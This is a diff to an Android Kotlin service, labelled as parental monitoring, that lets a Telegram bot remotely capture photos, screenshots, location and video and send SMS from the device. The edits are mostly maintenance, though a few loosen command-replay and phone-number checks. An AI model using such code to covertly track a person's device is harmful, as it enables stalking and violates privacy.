@@ -1322,11 +1322,7 @@ class MonitoringService : Service() {
                         if (!balasAngka && command.startsWith("/")) {
                             val aliasInput = resolveAliasInput(command, arg)
                             val input = aliasInput ?: if (arg.isEmpty()) command else "$command $arg"
-                            val effCommand = input.substringBefore(" ")
                             handleTelegramCommand(input, message?.date ?: 0, ownerOk, chatOk, senderId = senderId, privateChat = msgChatId.isNotEmpty() && msgChatId == senderId)
-                            if (effCommand in MUTATING_COMMANDS) {
-                                try { preferencesManager.setLastUpdateIdSync(update.updateId) } catch (_: Exception) { }
-                            }
                         } else if (!balasAngka) {
                             val aliasInput = resolveAliasInput(command, arg)
                             val privateOwner = ownerOk && msgChatId.isNotEmpty() && msgChatId == senderId
@@ -1607,8 +1603,10 @@ class MonitoringService : Service() {
         )
     }
 
+    private val menuBarGson = com.google.gson.Gson()
+
     private fun menuBarBody(): okhttp3.RequestBody {
-        return com.google.gson.Gson().toJson(quickMenuBar()).toRequestBody("text/plain".toMediaTypeOrNull())
+        return menuBarGson.toJson(quickMenuBar()).toRequestBody("text/plain".toMediaTypeOrNull())
     }
 
     private fun menuScreen(id: String): MenuScreen {
@@ -1693,9 +1691,9 @@ class MonitoringService : Service() {
                     listOf(button("\uD83D\uDCF8 Foto", "photo"), button("\uD83D\uDDA5 Tangkap layar", "shot")),
                     listOf(button("\uD83D\uDCCD Lokasi", "location"), button("\uD83D\uDCCA Status", "status")),
                     listOf(button("\uD83D\uDD0B Baterai", "battery"), button("\uD83D\uDEA8 Darurat", "x:darurat")),
-                    listOf(button("\uD83D\uDCF7 Foto &amp; rekam", "m:media"), button("\uD83D\uDCDE Komunikasi", "m:komu")),
-                    listOf(button("\uD83D\uDDFA\uFE0F Lokasi &amp; jejak", "m:lokasi"), button("\uD83D\uDCCA Info &amp; data", "m:info")),
-                    listOf(button("\uD83D\uDEE1\uFE0F Pengawasan", "m:pantau"), button("⚙️ Alat &amp; kontrol", "m:alat")),
+                    listOf(button("\uD83D\uDCF7 Foto & rekam", "m:media"), button("\uD83D\uDCDE Komunikasi", "m:komu")),
+                    listOf(button("\uD83D\uDDFA\uFE0F Lokasi & jejak", "m:lokasi"), button("\uD83D\uDCCA Info & data", "m:info")),
+                    listOf(button("\uD83D\uDEE1\uFE0F Pengawasan", "m:pantau"), button("⚙️ Alat & kontrol", "m:alat")),
                     listOf(button("\uD83D\uDD22 Atur angka", "m:angka"))
                 )
             )
@@ -1861,6 +1859,7 @@ class MonitoringService : Service() {
     }
 
     private suspend fun consumePendingInput(text: String, sentAtSec: Long, ownerOk: Boolean, chatOk: Boolean, senderId: String, privateChat: Boolean): Boolean {
+        if (!ownerOk) return false
         val pending = pendingInputCommand
         if (pending.isEmpty()) return false
         if (System.currentTimeMillis() - pendingInputAt > NUMBER_INPUT_TTL_MS) {
@@ -2116,6 +2115,7 @@ class MonitoringService : Service() {
             }
             sendToTelegram("📍 https://maps.google.com/?q=${loc.latitude},${loc.longitude}\nBaterai: ${if (level in 0..100) "$level%" else "?"}" + fixAgeNote(loc))
         } else {
+            bumpLocFailCount()
             sendToTelegram("📍 Lokasi tak didapat: " + locationFailureHint() + "\nBaterai: ${if (level in 0..100) "$level%" else "?"}")
         }
         try { captureAndSendPhoto(reportResult = true) } catch (_: Exception) { }
@@ -2423,8 +2423,10 @@ class MonitoringService : Service() {
             recordJob = serviceScope.launch {
                 try {
                     recordAndSendVideo(seconds)
-                } finally {
+                } catch (e: Throwable) {
                     recordBusy.set(false)
+                    recorderActive.set(false)
+                    throw e
                 }
             }
         }
@@ -2449,7 +2451,7 @@ class MonitoringService : Service() {
         val normalized = digits.toString()
         if (number.isEmpty() || smsText.isEmpty()) {
             sendToTelegram("Cara pakai: /sms &lt;nomor&gt; &lt;pesan&gt;")
-        } else if (badChar || plusCount > 1 || (plusCount == 1 && !number.startsWith("+")) || (plusCount == 1 && number.startsWith("+") && number.indexOf('+', 1) >= 0)) {
+        } else if (badChar || plusCount > 1) {
             sendToTelegram("\u26A0\uFE0F Nomor tidak valid. Cara pakai: /sms &lt;nomor&gt; &lt;pesan&gt;")
         } else if (!normalized.matches(SMS_NUMBER_REGEX)) {
             sendToTelegram("\u26A0\uFE0F Nomor tidak valid. Cara pakai: /sms &lt;nomor&gt; &lt;pesan&gt;")
@@ -2626,6 +2628,7 @@ class MonitoringService : Service() {
             sendToTelegram("📍 Mencari lokasi…")
             val location = fetchLocation(allowStale = true)
             if (location == null) {
+                bumpLocFailCount()
                 sendToTelegram("⚠️ Lokasi tak didapat: " + locationFailureHint())
             } else {
                 val stale = isStaleFix(location)
@@ -2689,7 +2692,7 @@ class MonitoringService : Service() {
         }
         if (crash != null) {
             if (sendFitted(crash)) {
-                CrashReporter.clearPending(this)
+                CrashReporter.clearPending(this, crash)
             }
         } else {
             sendToTelegram("\uD83E\uDDFE Belum ada crash.")
@@ -4006,9 +4009,7 @@ class MonitoringService : Service() {
     ): Boolean {
         try {
             if (NetworkUtils.isAuthBlocked(preferencesManager)) {
-                if (queueOnFail) {
-                    messageQueue.addMessage(message)
-                }
+                queueForRetry(message, queueOnFail)
                 return false
             }
             val rateRemain = NetworkUtils.rateLimitedRemainMs()
@@ -5953,6 +5954,8 @@ class MonitoringService : Service() {
             acquired.registerCallback(shotStopCallback, android.os.Handler(android.os.Looper.getMainLooper()))
         } catch (e: Exception) {
             android.util.Log.w("MonitoringService", "registerCallback tangkap layar gagal: " + redactToken(e.message))
+            try { acquired.stop() } catch (_: Exception) { }
+            com.redeye.parentalmonitor.utils.ScreenCapture.revoke()
             return null
         }
         com.redeye.parentalmonitor.utils.ScreenCapture.adopt(acquired)
@@ -7518,7 +7521,7 @@ class MonitoringService : Service() {
             if (response.isSuccessful && response.body()?.ok == true) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "✓ Photo sent successfully!")
                 noteSendOk()
-                preferencesManager.lastPhotoTime = System.currentTimeMillis()
+                try { preferencesManager.lastPhotoTime = System.currentTimeMillis() } catch (_: Exception) { }
                 deleteQuietly(photoFile)
                 return MediaSendOutcome.SENT
             }
